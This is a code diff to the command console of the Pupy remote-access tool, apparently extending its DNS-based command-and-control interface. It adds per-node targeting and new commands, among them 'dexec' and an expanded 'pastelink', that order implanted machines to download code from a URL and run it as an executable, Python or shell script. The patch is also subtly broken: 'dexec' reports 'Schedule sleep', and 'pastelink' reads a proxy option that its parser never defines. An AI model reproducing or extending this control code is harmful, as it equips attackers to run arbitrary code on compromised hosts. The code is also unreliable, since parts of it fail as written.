@@ -684,6 +684,10 @@ class PupyCmd(cmd.Cmd):
 
         arg_parser = PupyArgumentParser(
             prog='dnscnc', description=self.do_dnscnc.__doc__)
+        arg_parser.add_argument('-n', '--node', help='Send command only to this node (or session)')
+        arg_parser.add_argument('-d', '--default', action='store_true', default=False,
+                                 help='Set command as default for new connections')
+
         commands = arg_parser.add_subparsers(title='commands', dest='command')
         status = commands.add_parser('status', help='DNSCNC status')
         clist = commands.add_parser('list', help='List known DNSCNC clients')
@@ -694,36 +698,33 @@ class PupyCmd(cmd.Cmd):
         policy.add_argument('-t', '--timeout', type=int, help='Set session timeout')
 
         connect = commands.add_parser('connect', help='Request reverse connection')
-        connect.add_argument('-n', '--node', help='Send command only to this node')
-        connect.add_argument('-d', '--default', action='store_true', default=False,
-                                 help='Set command as default for new connections')
         connect.add_argument('-c', '--host', help='Manually specify external IP address for connection')
         connect.add_argument('-p', '--port', help='Manually specify external PORT for connection')
         connect.add_argument('-t', '--transport', help='Manually specify transport for connection')
 
         reset = commands.add_parser('reset', help='Reset scheduled commands')
-        reset.add_argument('-n', '--node', help='Remove all commands for specified node')
-        reset.add_argument('-d', '--default', action='store_true', default=False,
-                               help='Remove all default commands')
         disconnect = commands.add_parser('disconnect', help='Request disconnection')
-        disconnect.add_argument('-d', '--default', action='store_true', default=False,
-                                 help='Set command as default for new connections')
-        disconnect.add_argument('-n', '--node', help='Send command only to this node')
 
-        exit = commands.add_parser('exit', help='Request exit')
-        exit.add_argument('-d', '--default', action='store_true', default=False,
-                                 help='Set command as default for new connections')
-        exit.add_argument('-n', '--node', help='Send command only to this node')
+        reexec = commands.add_parser('reexec', help='Try to reexec module')
 
-        pastelink = commands.add_parser('pastelink', help='Execute code by link')
-        pastelink.add_argument('-a', '--action', choices=['exec', 'pyexec'], default='pyexec',
-                                   help='Action - execute as executable, or evaluate as python code')
+        sleep = commands.add_parser('sleep', help='Postpone any activity')
+        sleep.add_argument('-t', '--timeout', default=10, type=int, help='Timeout (seconds)')
+
+        pastelink = commands.add_parser('pastelink', help='Execute code by link to pastebin service')
+        pastelink.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
+                                   help='Action - execute as executable, or evaluate as python/sh code')
         pastelink_src = pastelink.add_mutually_exclusive_group(required=True)
         pastelink_src.add_argument('-c', '--create', help='Create new pastelink from file')
         pastelink_src.add_argument('-u', '--url', help='Specify existing URL')
-        pastelink.add_argument('-d', '--default', action='store_true', default=False,
-                                 help='Set command as default for new connections')
-        pastelink.add_argument('-n', '--node', help='Send command only to this node')
+
+        dexec = commands.add_parser('dexec', help='Execute code by link to service controlled by you')
+        dexec.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
+                                   help='Action - execute as executable, or evaluate as python/sh code')
+        dexec.add_argument('-u', '--url', required=True, help='URL to data')
+        dexec.add_argument('-p', '--proxy', action='store_true', default=False,
+                               help='Ask to use system proxy (http/https only)')
+
+        exit = commands.add_parser('exit', help='Request exit')
 
         try:
             args = arg_parser.parse_args(shlex.split(arg))
@@ -802,7 +803,7 @@ class PupyCmd(cmd.Cmd):
             if all([x is None for x in [args.kex, args.timeout, args.poll]]):
                 self.display_error('No arguments provided.')
             else:
-                count = self.dnscnc.set_policy(args.kex, args.timeout, args.poll)
+                count = self.dnscnc.set_policy(args.kex, args.timeout, args.poll, node=args.node)
                 if count:
                     self.display_success('Apply policy to {} known nodes'.format(count))
 
@@ -853,12 +854,49 @@ class PupyCmd(cmd.Cmd):
             elif args.node:
                 self.display_error('Node {} not found'.format(args.node))
 
+        elif args.command == 'reexec':
+            count = self.dnscnc.reexec(
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule reexec to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'sleep':
+            count = self.dnscnc.sleep(
+                args.timeout,
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule sleep to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'dexec':
+            count = self.dnscnc.dexec(
+                args.url,
+                args.action,
+                proxy=args.proxy,
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule sleep to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
         elif args.command == 'pastelink':
             try:
                 count, url = self.dnscnc.pastelink(
-                    content=args.create,
-                    url=args.url,
-                    action=args.action,
+                    args.url,
+                    args.action,
+                    proxy=args.proxy,
                     node=args.node,
                     default=args.default
                 )
